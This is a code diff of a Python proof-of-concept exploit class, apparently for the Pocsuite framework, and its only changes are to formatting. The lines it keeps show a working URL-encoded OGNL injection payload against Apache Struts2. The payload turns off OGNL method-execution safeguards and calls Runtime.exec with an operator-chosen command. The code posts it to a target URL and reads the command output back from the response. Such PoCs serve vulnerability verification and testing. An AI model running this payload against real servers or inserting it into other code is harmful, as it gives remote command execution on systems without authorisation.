@@ -62,7 +62,7 @@ class DemoPOC(POCBase):
     def _attack(self):
         p = self._check()
         result = {}
-        if p :
+        if p:
             exec_payload = "'%20%2B%20(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean(%22false%22)%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString(%40java.lang.Runtime%40getRuntime().exec('{cmd}').getInputStream()))%20%2B%20'"
             headers = {}
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
@@ -72,11 +72,11 @@ class DemoPOC(POCBase):
             data = data.format(exp=exec_payload.format(cmd=quote(command)))
             html = requests.post(self.url, data=data, headers=headers).text
 
-            exec_res = get_middle_text(html,"\"age\" value=\"","\n")
+            exec_res = get_middle_text(html, "\"age\" value=\"", "\n")
             result["VerifyInfo"] = {
                 "URL": self.url,
                 "PAYLOAD": data,
-                "result":exec_res
+                "result": exec_res
             }
         return self.parse_output(result)
 
